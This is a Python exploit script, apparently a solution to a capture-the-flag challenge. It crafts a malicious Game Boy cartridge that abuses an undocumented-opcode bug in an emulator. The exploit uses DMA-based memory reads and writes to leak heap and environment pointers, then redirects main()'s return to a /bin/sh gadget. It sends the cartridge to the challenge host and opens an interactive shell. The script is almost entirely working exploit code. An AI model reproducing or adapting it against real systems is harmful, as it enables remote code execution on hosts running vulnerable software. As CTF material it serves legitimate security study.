import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)


def write_cart(cart, offset, data):
    for c in data:
        cart[offset] = c
        offset += 1

def opcodes_mov64(dst, src):
    s = ""
    for i in xrange(8):
        s += "\xfa" + struct.pack("<H", src+i) + "\xea" + struct.pack("<H", dst+i)
        
    return s

def opcodes_add64(dst, src, delta):
    delta = delta & 0xffffffffffffffff
    s = ""
    for i in xrange(8):
        s += "\xfa" + struct.pack("<H", src+i)
        
        if i == 0:
            s += "\xc6"
        else:
            s += "\xce"
        s += chr(delta & 0xff)
        
        s += "\xea" + struct.pack("<H", dst+i)
        
        delta >>= 8
        
    return s


offset_gb_rom = 0x00025ab0
offset_arena_to_environ = 0x00000000003A7FB8-0x00000000003A5678
offset_arena_to_shell_gadget = 0x0000000000041374-0x00000000003A5678
offset_environ_to_mainret = -0xf0

cart = ["\x00"] * 0x8000

# trigger bug in undocumented opcode ED - shifts GB memory downwards by 0x80 bytes
write_cart(cart, 0x100, "\x3e\x80\x0e\x90\xed")

# the shift changes where PC points, so do a jump - all ROM offsets are -0x80 relative after this
write_cart(cart, 0x100+5-0x80, "\xc3\x00\x02")

write_cart(cart, 0x200-0x80,
    # disable interrupts - don't need to worry about setting IRQ vectors correctly or masking interrupts
    "\xf3" + 
    
    # copy loop - copies VM state from 0010-0100 to D000-D0F0
    "\x11\x10\x00\x21\x00\xd0\x0e\xf0" + 
    "\x1a\x13\x22\x0d\x20\xfa" + 

    # sets PC in copied block to 0x0400
    "\x3e\x00\xea\x40\xd0" +
    "\x3e\x04\xea\x41\xd0" +
    
    # sets DMA destination to right above target data we want to read
    opcodes_add64(0x0018, 0x0010, offset_gb_rom + 0x10) +
    
    # DMA transfers bank D000 to destination
    "\x3e\xd0\xea\x46\xff" +    
    
    # sets DMA destination to start of heap in copied block
    opcodes_mov64(0xd008, 0x0010) +
    
    # sets PC after context pivot
    "\x3e\x80\xea\x40\xd0" +
    "\x3e\xfe\xea\x41\xd0" +
    
    # sets CPU memory address after context pivot
    opcodes_add64(0xd000, 0x0018, -0xfe10) +
    
    # sets DMA destination to VM state
    opcodes_add64(0x0018, 0x0010, 0x10) +
    
    # do pivot
    "\x3e\xd0\xea\x46\xff")
    
write_cart(cart, 0x400-0x80, 
    # make backup of arena pointer
    opcodes_mov64(0xc000, 0x0000) +
    
    # copy loop - copies VM state from 0010-0100 to D000-D0F0
    "\x11\x10\x00\x21\x00\xd0\x0e\xf0" + 
    "\x1a\x13\x22\x0d\x20\xfa" + 
    
    # sets PC in copied block to 0x0600
    "\x3e\x00\xea\x40\xd0" +
    "\x3e\x06\xea\x41\xd0" +
    
    # sets DMA destination to right above target data we want to read
    opcodes_add64(0x0018, 0x0000, offset_arena_to_environ + 0x10) +
    
    # DMA transfers bank D000 to destination
    "\x3e\xd0\xea\x46\xff" +
    
    # sets DMA destination to start of heap in copied block
    opcodes_mov64(0xd008, 0x0010) +
    
    # sets PC after context pivot
    "\x3e\x80\xea\x40\xd0" +
    "\x3e\xfe\xea\x41\xd0" +
    
    # sets CPU memory address after context pivot
    opcodes_add64(0xd000, 0x0018, -0xfe10) +
    
    # sets DMA destination to VM state
    opcodes_add64(0x0018, 0x0010, 0x10) +
    
    # do pivot
    "\x3e\xd0\xea\x46\xff")

write_cart(cart, 0x600-0x80,
    # make backup of environ pointer
    opcodes_mov64(0xc008, 0x0000) +
    
    # calculates address to one-shot /bin/sh gadget
    opcodes_add64(0x0000, 0xc000, offset_arena_to_shell_gadget) +
    
    # point DMA destination to return address of main()
    opcodes_add64(0x0018, 0xc008, offset_environ_to_mainret) +
    
    # DMA transfers bank 0000 to destination
    "\x3e\x00\xea\x46\xff" +
    
     # illegal opcode, triggers return from main()
    "\xfd"
    )

# context pivot stub - after pivot, this is seen as address 0xfe80
write_cart(cart, 0, "\x3e\xfe\xea\x46\xff")


cart = "".join(cart)

sc = socket.create_connection(("gameboy.chal.pwning.xxx", 30908))
# sc = socket.create_connection(("10.0.0.97", 12345))

sc.send(cart)

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  
